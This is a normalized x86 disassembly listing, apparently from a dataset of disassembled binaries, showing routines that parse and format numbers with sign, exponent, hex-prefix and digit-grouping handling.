call sub_1003bed4
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_1003bc51
cmp [ ebp - 0x54 ] ax
ja r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x6c ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov ecx esi
movzx edi ax
call sub_1003bc51
cmp ax di
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
call sub_1003bc51
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx [ ebp - 0x6c ]
mov eax [ ecx ]
call [ eax + 0x8 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
movzx edi ax
call sub_10005ad1
push [ ebp - 0x58 ]
and [ ebp - 0x5c ] 0x0
push esi
mov [ ebp - 0x4 ] 0x1
call sub_1003bed4
pop ecx
pop ecx
test al al
je r-xdata
push [ ebp - 0x58 ]
push esi
call sub_1003bed4
pop ecx
pop ecx
test al al
jne r-xdata
jmp r-xdata
call sub_100208a9
mov eax [ eax ]
mov al [ eax ]
mov [ ebx ] al
mov ecx esi
inc ebx
call sub_1003b9f8
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
cmp [ ebp - 0x50 ] 0x24
jl r-xdata
cmp [ ebp - 0x14 ] 0x10
mov edi [ ebp - 0x28 ]
jae r-xdata
mov ecx esi
call sub_1003bc51
cmp [ ebp - 0x54 ] ax
ja r-xdata
mov ecx esi
call sub_1003bc51
cmp [ ebp - 0x54 ] ax
ja r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
push [ ebp - 0x58 ]
push esi
call sub_1003bed4
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebx ] 0x30
inc ebx
mov ecx esi
call sub_1003bc51
cmp ax [ ebp - 0x54 ]
jne r-xdata
inc [ ebp - 0x60 ]
jmp r-xdata
cmp [ ebp - 0x4a ] 0x0
jne r-xdata
lea edi [ ebp - 0x28 ]
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005bdf
cmp [ eax ] 0x0
je r-xdata
mov ecx esi
call sub_1003bc51
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_1003bc51
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
cmp [ ebp - 0x4a ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
push esi
call sub_1003bed4
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_1003bc51
cmp ax [ ebp - 0x54 ]
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
jge r-xdata
mov ecx esi
call sub_1003bc51
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1003b9f8
push [ ebp - 0x58 ]
push esi
call sub_1003bed4
pop ecx
pop ecx
test al al
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_100023ce
jmp r-xdata
cmp [ ebp - 0x5c ] 0x0
jbe r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
test di di
je r-xdata
cmp [ ebp - 0x50 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
cmp [ ebp - 0x50 ] 0x24
jge r-xdata
mov ebx [ ebp - 0x68 ]
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x65
call sub_1003a3ed
add esp 0xc
mov ecx esi
mov di ax
call sub_1003bc51
cmp ax di
je r-xdata
dec [ ebp - 0x60 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1003b9f8
mov [ ebx ] 0x30
inc ebx
inc [ ebp - 0x60 ]
jmp r-xdata
cmp [ edi ] 0x7f
je r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005bdf
cmp [ eax ] 0x0
jle r-xdata
mov ecx esi
call sub_1003bc51
cmp ax di
jne r-xdata
mov ecx esi
call sub_1003bc51
cmp ax [ ebp - 0x54 ]
jne r-xdata
inc [ ebp - 0x60 ]
jmp r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1003b9f8
mov ecx esi
call sub_1003bc51
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx ] 0x0
call sub_100023ce
mov eax [ ebp - 0x60 ]
call sub_10023f1f
retn
mov [ ebx ] 0x65
mov ecx esi
inc ebx
call sub_1003b9f8
push [ ebp - 0x58 ]
and [ ebp - 0x50 ] 0x0
mov ecx esi
mov [ ebp - 0x49 ] 0x0
call sub_1003bad8
test al al
jne r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x45
call sub_1003a3ed
add esp 0xc
mov ecx esi
mov di ax
call sub_1003bc51
cmp ax di
jne r-xdata
dec [ ebp - 0x5c ]
je r-xdata
mov [ ebp - 0x4a ] 0x1
inc [ ebp - 0x5c ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10005af7
inc [ ebp - 0x5c ]
mov ecx esi
call sub_1003bc51
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
je r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005bdf
cmp [ eax ] 0x7f
je r-xdata
push [ ebp - 0x58 ]
push esi
call sub_1003bed4
pop ecx
pop ecx
test al al
je r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x2b
call sub_1003a3ed
add esp 0xc
mov ecx esi
mov di ax
call sub_1003bc51
cmp ax di
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005bdf
mov cl [ edi ]
cmp cl [ eax ]
jne r-xdata
mov ecx esi
call sub_1003b9f8
push [ ebp - 0x58 ]
push esi
call sub_1003bed4
pop ecx
pop ecx
test al al
jne r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005bdf
inc [ eax ]
jmp r-xdata
push [ ebp - 0x58 ]
push esi
call sub_1003bed4
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx esi
call sub_1003bc51
cmp ax [ ebp - 0x54 ]
jne r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x2d
call sub_1003a3ed
add esp 0xc
mov ecx esi
mov di ax
call sub_1003bc51
cmp ax di
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005bdf
mov cl [ edi ]
cmp cl [ eax ]
jl r-xdata
mov [ ebp - 0x4a ] 0x1
mov ecx esi
call sub_1003bc51
cmp [ ebp - 0x54 ] ax
ja r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1003b9f8
push [ ebp - 0x58 ]
push esi
call sub_1003bed4
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebx ] 0x2d
mov ecx esi
inc ebx
call sub_1003b9f8
mov edi eax
jmp r-xdata
mov ecx esi
call sub_1003bc51
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov [ ebx ] 0x30
inc ebx
jmp r-xdata
cmp [ ebp - 0x50 ] 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1003b9f8
mov ecx esi
call sub_1003bc51
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
sub_1003fbd1
push 0x6c
mov eax sub_10048075
call sub_10023e9c
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x74 ] eax
lea eax [ ebp - 0x78 ]
push eax
mov [ ebp - 0x60 ] ecx
call sub_10007b59
and [ ebp - 0x4 ] 0x0
push eax
call sub_1003dd96
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov ebx eax
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x64 ] ebx
call sub_10007b41
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_1004458c
mov eax [ ebx ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x8 ]
movzx eax ax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x6c ] eax
call sub_10007ee2
lea eax [ edi + 0x8 ]
push eax
xor ebx ebx
push ebx
push 0x30
mov [ ebp - 0x4 ] 0x2
call sub_1003a3ed
movzx eax ax
mov [ ebp - 0x54 ] eax
mov al [ esi ]
add esp 0xc
cmp al 0x2b
je r-xdata
mov [ ebp - 0x70 ] 0x1
mov [ ebp - 0x70 ] ebx
cmp al 0x2d
jne r-xdata
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
mov [ ebp + 0x2c ] ebx
call sub_100208a9
mov eax [ eax ]
push [ ebp + 0x30 ]
mov al [ eax ]
push 0x65
push esi
mov [ ebp - 0x50 ] al
mov [ ebp - 0x4f ] 0x65
mov [ ebp - 0x4e ] bl
call sub_100208d0
push [ ebp + 0x30 ]
mov [ ebp - 0x58 ] eax
movsx eax [ ebp - 0x50 ]
push eax
push esi
call sub_100208d0
add esp 0x18
mov [ ebp - 0x4c ] eax
cmp eax ebx
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x44 ]
mov ecx [ ebp + 0x28 ]
mov eax [ ebp + 0x24 ]
mov edx [ ebp - 0x60 ]
add eax ecx
add eax [ ebp + 0x2c ]
mov ecx [ edx + 0x18 ]
add eax [ ebp + 0x30 ]
cmp ecx ebx
jle r-xdata
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
mov [ ebp - 0x4c ] ebx
cmp ecx eax
jbe r-xdata
cmp [ eax ] bl
jle r-xdata
lea eax [ ebp - 0x44 ]
movsx eax [ ebp - 0x50 ]
push [ ebp + 0x30 ]
push eax
push esi
call sub_100208d0
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax 0x100
jne r-xdata
sub ecx eax
mov [ ebp - 0x4c ] ecx
jmp r-xdata
push [ ebp + 0x30 ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_10007042
mov eax [ ebp - 0x58 ]
cmp eax ebx
jne r-xdata
push [ ebp + 0x30 ]
push 0x65
push esi
call sub_100208d0
add esp 0xc
cmp eax ebx
je r-xdata
push [ ebp - 0x6c ]
sub eax esi
inc eax
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1003b727
mov ecx [ eax ]
push [ ebp + 0x24 ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x54 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x5c ]
push eax
push edi
call sub_1003b31f
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x64 ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
movzx eax ax
push 0x1
push eax
push [ ebp + 0x14 ]
lea eax [ ebp - 0x68 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1003b31f
mov ecx [ eax ]
push [ ebp + 0x28 ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x54 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x68 ]
push eax
push edi
call sub_1003b31f
mov ecx [ eax ]
sub [ ebp + 0x30 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x30
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
push [ ebp - 0x4c ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1003b31f
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4c ] ebx
mov [ ebp + 0x14 ] eax
add esp 0x18
cmp [ ebp - 0x70 ] ebx
jbe r-xdata
mov eax [ edx + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
cmp [ ebp - 0x4c ] ebx
jne r-xdata
push 0x30
push [ ebp + 0x2c ]
lea ecx [ ebp - 0x2c ]
call sub_10005af7
jmp r-xdata
push [ ebp - 0x6c ]
lea eax [ ebp - 0x68 ]
push [ ebp + 0x30 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1003b727
mov ecx [ eax ]
push [ ebp + 0x2c ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x54 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x5c ]
push eax
push edi
call sub_1003b31f
mov ecx [ eax ]
push [ ebp - 0x4c ]
mov edx [ ebp - 0x60 ]
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x74 ]
mov [ ebp + 0x14 ] eax
push edi
mov [ edx + 0x18 ] ebx
call sub_1003b31f
add esp 0x4c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100023ce
mov eax [ ebp - 0x74 ]
call sub_10023f1f
retn
push [ ebp - 0x6c ]
sub eax esi
inc eax
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x68 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1003b727
mov ecx [ eax ]
push [ ebp + 0x2c ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x54 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x68 ]
push eax
push edi
call sub_1003b31f
mov ecx [ eax ]
and [ ebp + 0x2c ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
mov ecx [ ebp - 0x60 ]
add esp 0x34
test [ ecx + 0x10 ] 0x4
mov ecx r--data
jne r-xdata
push 0x1
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1003b6da
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
inc esi
dec [ ebp + 0x30 ]
mov [ ebp + 0x14 ] eax
push 0x30
push [ ebp + 0x2c ]
sub eax esi
push eax
lea ecx [ ebp - 0x2c ]
call sub_10005b45
push 0x30
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x2c ]
call sub_10005af7
mov eax [ ebp - 0x58 ]
mov [ ebp + 0x24 ] ebx
push 0x30
lea ecx [ ebp - 0x2c ]
cmp [ ebp - 0x4c ] ebx
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x68 ]
push eax
push edi
call sub_1003b6da
mov ecx [ eax ]
sub [ ebp + 0x30 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
mov ecx r--data
mov ebx [ ebp - 0x4c ]
push [ ebp + 0x28 ]
sub ebx esi
lea eax [ ebx + 0x1 ]
push eax
call sub_10005b45
push 0x30
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x2c ]
push ebx
call sub_10005b45
and [ ebp + 0x28 ] 0x0
xor ebx ebx
push [ ebp + 0x24 ]
call sub_10005af7
jmp r-xdata
lea eax [ ebp - 0x50 ]
push eax
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
push eax
call sub_10020980
pop ecx
pop ecx
mov [ ebp - 0x4c ] eax
jmp r-xdata
lea esi [ ebp - 0x44 ]
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
mov [ ebp + 0x24 ] ebx
jae r-xdata
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov esi eax
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x2c ] ebx
mov [ ebp + 0x30 ] eax
mov ecx [ ebp - 0x4c ]
sub ecx [ ebp - 0x70 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub [ ebp - 0x4c ] eax
push ebx
push 0x1
push [ ebp - 0x4c ]
lea ecx [ ebp - 0x2c ]
call sub_10005b45
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_1004001d
push 0x44
mov eax sub_100480aa
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4c ] eax
lea eax [ ebp - 0x50 ]
push eax
mov ecx ebx
mov [ ebp - 0x40 ] ebx
call sub_10007b59
and [ ebp - 0x4 ] 0x0
push eax
call sub_1003dd96
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x48 ] eax
call sub_10007b41
mov ecx [ ebp - 0x48 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1004458c
mov al [ esi ]
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
cmp al 0x2b
je r-xdata
mov [ ebp - 0x38 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
cmp al 0x30
jne r-xdata
mov edi [ ebx + 0x18 ]
test edi edi
jle r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax ecx
jae r-xdata
and [ ebp - 0x38 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
xor edi edi
cmp edi [ ebp + 0x24 ]
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x14 ] 0x10
mov ecx [ ebp - 0x28 ]
mov eax ecx
jae r-xdata
mov [ ebp - 0x38 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x48 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
push eax
push [ ebp + 0x24 ]
lea eax [ ebp - 0x3c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x34 ]
call sub_1003b727
mov ecx [ eax ]
push edi
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
and [ ebx + 0x18 ] 0x0
push eax
push ecx
push [ ebp - 0x4c ]
mov [ ebp + 0x14 ] eax
push [ ebp - 0x34 ]
call sub_1003b31f
add esp 0x34
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
mov eax [ ebp - 0x4c ]
call sub_10023f1f
retn
cmp eax 0x100
lea eax [ ebp - 0x44 ]
je r-xdata
sub edi [ ebp + 0x24 ]
jmp r-xdata
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
push [ ebp - 0x38 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x34 ]
call sub_1003b6da
mov ecx [ eax ]
push edi
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ ebp - 0x38 ]
push [ eax ]
sub [ ebp + 0x24 ] ecx
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
add esi ecx
call sub_1003b31f
add esp 0x30
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x34 ]
call sub_1003b31f
add esp 0x18
jmp r-xdata
mov eax [ ebx + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x30 ] ecx
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor edi edi
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x30 ]
mov al [ eax ]
cmp al 0x7f
jne r-xdata
mov edi [ ebp + 0x24 ]
jmp r-xdata
test al al
jle r-xdata
mov ecx edi
sub ecx [ ebp - 0x38 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub edi eax
mov eax [ ebp + 0x24 ]
sub eax edi
inc eax
push eax
lea ebx [ esi + edi ]
push ebx
push eax
lea eax [ esi + edi + 0x1 ]
push eax
call sub_100203cb
mov eax [ ebp - 0x30 ]
add esp 0x10
inc [ ebp + 0x24 ]
inc eax
mov [ ebx ] 0x0
cmp [ eax ] 0x0
jle r-xdata
mov ebx [ ebp - 0x40 ]
mov [ ebp - 0x30 ] eax
sub_10040209
push 0x16c
mov eax sub_100481af
call sub_10023e9c
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x18 ]
mov esi [ ebp + 0x8 ]
and [ ebp - 0x70 ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xa4 ] ecx
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x74 ] eax
mov [ ebp - 0xa8 ] edi
mov ecx edi
je r-xdata
lea eax [ ebp - 0xac ]
push eax
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1003e0a7
pop ecx
mov ebx eax
mov [ ebp - 0xa0 ] eax
lea ecx [ ebp - 0xac ]
lea eax [ ebp - 0xb0 ]
push eax
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1003e144
mov ebx eax
pop ecx
mov [ ebp - 0xa0 ] ebx
lea ecx [ ebp - 0xb0 ]
jmp r-xdata
mov ecx [ ebp - 0x90 ]
cmp ecx 0x4
jae r-xdata
call sub_10007b41
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x65 ] 0x0
mov [ ebp - 0x75 ] 0x0
call sub_1003c01f
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_1003c01f
mov eax [ ebx ]
lea ecx [ ebp - 0xb4 ]
push ecx
mov ecx ebx
mov [ ebp - 0x70 ] 0x1
call [ eax + 0x24 ]
and [ ebp - 0x90 ] 0x0
jmp r-xdata
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0xb4 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x7c ]
push 0xffffffff
push 0x0
call sub_1003bc67
jmp r-xdata
cmp [ ebp - 0x34 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1003bd13
mov eax [ ebp - 0x7c ]
call sub_10023f1f
retn 0x14
cmp [ ebp - 0x75 ] 0x0
je r-xdata
and [ ebp - 0x8c ] 0x0
and [ ebp - 0x88 ] 0x0
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_1003bbc2
mov ecx [ eax ]
mov [ ebp - 0x8c ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x88 ] eax
jmp r-xdata
inc [ ebp - 0x90 ]
cmp [ ebp - 0x65 ] 0x0
je r-xdata
lea eax [ ebp - 0x88 ]
push eax
mov ecx edi
call sub_10007b59
push eax
mov [ ebp - 0x4 ] 0xd
call sub_1003d774
pop ecx
lea ecx [ ebp - 0x88 ]
mov esi eax
mov [ ebp - 0x4 ] 0x3
call sub_10007b41
mov edi [ ebp - 0x6c ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1003c0be
test [ edi + 0x10 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0xa4 ]
add eax 0x8
push eax
push 0x0
push 0x2d
call sub_1003a3ed
mov ecx [ ebp - 0x7c ]
add esp 0xc
movzx eax ax
push eax
push 0x1
push 0x0
call sub_1003c422
lea eax [ ebp - 0x98 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_1003bce9
push eax
lea ecx [ ebp - 0x8c ]
call sub_1003b046
mov ecx eax
call sub_1003ba51
test al al
jne r-xdata
mov ebx [ ebp - 0xa0 ]
mov edi [ ebp - 0xa8 ]
push [ ebp - 0x74 ]
push edi
call sub_1003bed4
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x90 ] 0x3
jne r-xdata
cmp [ ebp - 0x14 ] 0x8
mov esi [ ebp - 0x28 ]
jae r-xdata
push [ ebp - 0x74 ]
mov ecx [ ebp - 0x6c ]
call sub_1003bad8
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
push [ ebp - 0x74 ]
push [ ebp - 0x6c ]
call sub_1003bed4
pop ecx
pop ecx
test al al
je r-xdata
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_1003bce9
push eax
lea ecx [ ebp - 0x8c ]
call sub_1003ba51
test al al
je r-xdata
mov ecx edi
call sub_1003bc51
mov edx [ esi ]
movzx eax ax
push eax
push 0x48
mov ecx esi
call [ edx + 0x8 ]
test al al
je r-xdata
lea eax [ ebp - 0xd0 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_1003bbc2
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x98 ] ecx
mov [ ebp - 0x94 ] eax
jmp r-xdata
cmp [ ebp - 0x34 ] 0x1
ja r-xdata
mov ecx [ ebp - 0x6c ]
call sub_1003bc51
cmp ax [ esi ]
jne r-xdata
lea esi [ ebp - 0x28 ]
lea eax [ ebp - 0x124 ]
push eax
mov ecx ebx
call sub_1003c182
or [ ebp - 0x70 ] 0x2
cmp [ eax + 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov eax [ ebx ]
xor esi esi
mov ecx ebx
mov [ ebp - 0x84 ] esi
call [ eax + 0x1c ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp - 0xa4 ]
add eax 0x8
push eax
push esi
push 0x30
call sub_1003a3ed
movzx eax ax
mov [ ebp - 0x80 ] eax
add esp 0xc
lea eax [ ebp - 0x64 ]
push eax
mov ecx ebx
call sub_1004458c
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x50 ] esi
je r-xdata
dec eax
dec eax
jne r-xdata
lea ecx [ ebp - 0x8c ]
call sub_1003aed5
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_1003bc51
cmp ax [ esi ]
jne r-xdata
mov ecx edi
call sub_1003b9f8
push [ ebp - 0x74 ]
push [ ebp - 0x6c ]
call sub_1003bed4
pop ecx
pop ecx
test al al
jne r-xdata
push [ ebp - 0x74 ]
mov ecx [ ebp - 0x6c ]
call sub_1003bad8
test al al
jne r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_1003bc67
mov [ ebp - 0x76 ] 0x0
lea eax [ ebp - 0xec ]
push eax
mov ecx ebx
call sub_1003c182
or [ ebp - 0x70 ] 0x4
push 0x0
mov ecx eax
mov [ ebp - 0x4 ] 0x6
call sub_1003b482
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_1003bc51
mov [ ebp - 0x76 ] 0x1
cmp [ esi ] ax
je r-xdata
push [ ebp - 0x74 ]
push [ ebp - 0x6c ]
call sub_1003bed4
pop ecx
pop ecx
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0xb8 ] eax
cmp ax si
je r-xdata
mov ecx [ ebp - 0x6c ]
call sub_1003b9f8
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_1003bce9
push eax
lea ecx [ ebp - 0x98 ]
call sub_1003ba51
test al al
je r-xdata
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_1003bce9
push eax
lea ecx [ ebp - 0x98 ]
call sub_1003ba51
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x8
mov esi [ ebp - 0x28 ]
jae r-xdata
test [ ebp - 0x70 ] 0x2
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x70 ] 0xfffffffb
push esi
push 0x1
